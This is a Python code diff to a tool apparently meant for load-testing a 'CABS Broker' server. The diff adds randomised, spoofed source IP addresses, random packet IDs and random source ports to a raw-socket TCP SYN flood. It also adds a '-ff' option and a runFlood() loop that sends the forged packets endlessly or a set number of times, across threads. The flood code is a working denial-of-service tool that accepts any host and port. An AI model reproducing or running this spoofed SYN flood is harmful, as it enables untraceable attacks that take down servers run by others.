@@ -34,6 +34,16 @@ def checksum(msg):
     
     return cksum
 
+def genIP():
+    skip = [127,169,172]
+    
+    first = random.randrange(1,256)
+    while first in skip:
+        first = random.randrange(1,256)
+    
+    ip = '.'.join([str(first),str(random.randrange(1,256)),str(random.randrange(1,256)),str(random.randrange(1,256))])
+    return ip
+
 def floodServer():
     #flood portion adopted from a script by Silver Moon (m00n.silv3r@gmail.com)
     try:
@@ -47,14 +57,14 @@ def floodServer():
     #Constuct packet
     packet = ''
     host = socket.gethostbyname(settings.get("Host"))
-    source = host
+    source = genIP()
     
     #ip headers
     ihl = 5
     version = 4
     tos = 0
     tot_len = 20 + 20 #python correctly fills in the total length?
-    packetid = 57543
+    packetid = random.randint(1025,65000)
     frag_off = 0
     ttl = 225
     protocol = socket.IPPROTO_TCP
@@ -65,7 +75,7 @@ def floodServer():
     ip_header = struct.pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, packetid, frag_off, ttl, protocol, check, saddr, daddr)
     
     #tcp header fields
-    source_p = 1234
+    source_p = random.randint(1025, 65532)
     host_p = int(settings.get("Port"))
     seq = 0
     ack_seq = 0
@@ -99,19 +109,36 @@ def floodServer():
     tcp_header = struct.pack('!HHLLBBHHH', source_p, host_p, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum, urg_ptr)
     #make the final packet
     packet = ip_header + tcp_header
-    if settings.get("Number") == 'loop':
-        print("Running... Press Ctrl-C to end")
-        while True:
+    if settings.get("Rand_Roll") == 'True':
+        try:
             s.sendto(packet, (host, 0))
+            if settings.get("Verbose") == 'True':
+                print "Sent: SYN packet from {0}:{1} to {2}:{3}".format(source, source_p, host, host_p)
+        except:
+            if settings.get("Verbose") == 'True':
+                print "Unable to send SYN packet."
     else:
-        for i in range(int(settings.get("Number"))):
-            try:
-                s.sendto(packet, (host, 0))
-                if settings.get("Verbose") == 'True':
-                    print "Sent: SYN packet"
-            except:
-                if settings.get("Verbose") == 'True':
-                    print "Unable to send SYN packet."
+        if settings.get("Number") == 'loop':
+            print("Running... Press Ctrl-C to end")
+            while True:
+                try:
+                    s.sendto(packet, (host, 0))
+                    if settings.get("Verbose") == 'True':
+                        print "Sent: SYN packet from {0}:{1} to {2}:{3}".format(source, source_p, host, host_p)
+                except Exception as e:
+                    print e
+                    if settings.get("Verbose") == 'True':
+                        print "Unable to send SYN packet."
+        else:
+            for i in range(int(settings.get("Number"))):
+                try:
+                    s.sendto(packet, (host, 0))
+                    if settings.get("Verbose") == 'True':
+                        print "Sent: SYN packet from {0}:{1} to {2}:{3}".format(source, source_p, host, host_p)
+                except Exception as e:
+                    print e
+                    if settings.get("Verbose") == 'True':
+                        print "Unable to send SYN packet."
         
 
 def hitServer():
@@ -143,11 +170,12 @@ def hitServer():
             print "Sent: {0}".format(content)
 
 def printUsage(extend=False):
-    print "Usage : "+sys.argv[0]+" -h host [-p port] [-f] [-v] [-s /path/to/cert.pem] [-r] [-e] [-n (#tries | loop)] [-t #threads] [(-m msg) | (-l msg_length)]"
+    print "Usage : "+sys.argv[0]+" -h host [-p port] [(-f)|(-ff)] [-v] [-s /path/to/cert.pem] [-r] [-e] [-n (#tries | loop)] [-t #threads] [(-m msg) | (-l msg_length)]"
     if extend:
         print "  -h host           : the CABS Broker Server"
         print "  -p port           : the CABS Broker Port for Clients or Agents"
         print "  -f                : SYN flood, only available on linux as root"
+        print "  -ff               : SYN flood with random id, only available on linux as root"
         print "  -v                : Verbose, warning this outputs a lot!"
         print "  -s /to/cert.pem   : the path to the CABS Broker certificate.pem"
         print "  -r                : don't add a valid return at the end of the message"
@@ -177,6 +205,9 @@ def getArgs():
                 option = "Host"
             elif sys.argv[i] in ['-f', '--flood', '-flood', '--syn-flood']:
                 settings["Syn_Flood"] = 'True'
+            elif sys.argv[i] in ['-ff', '--flood-rand', '-flood-rand', '--syn-flood-rand']:
+                settings["Syn_Flood"] = 'True'
+                settings["Rand_Roll"] = 'True'
             elif sys.argv[i] in ['-v', '--verbose', '-verbose']:
                 settings["Verbose"] = 'True'
             elif sys.argv[i] in ['-p', '--port', '-port']:
@@ -208,6 +239,18 @@ def getArgs():
     if not settings.get("Threads"):
         settings["Threads"] = 1
 
+def runFlood():
+    if settings.get("Rand_Roll") == 'True':
+        if settings.get("Number") == 'loop':
+            print("Running... Press Ctrl-C to end")
+            while True:
+                floodServer()
+        else:
+            for i in range(int(settings.get("Number"))):
+                floodServer()
+    else:
+        floodServer()
+
 def runHit():
     if settings.get("Number") == 'loop':
         while True:
@@ -219,12 +262,12 @@ def runHit():
 def gucci_main():
     getArgs()
     splash()
-    
+   
     if int(settings.get("Threads")) > 1:
         threads = []
         for i in range(int(settings.get("Threads"))):
             if settings.get("Syn_Flood") == 'True':
-                t=threading.Thread(target=floodServer)
+                t=threading.Thread(target=runFlood)
             else:
                 t=threading.Thread(target=runHit)
             
@@ -236,7 +279,7 @@ def gucci_main():
             input("Running... Press Enter to end")
     else:
         if settings.get("Syn_Flood") == 'True':
-            floodServer()
+            runFlood()
         else:
             runHit()
     
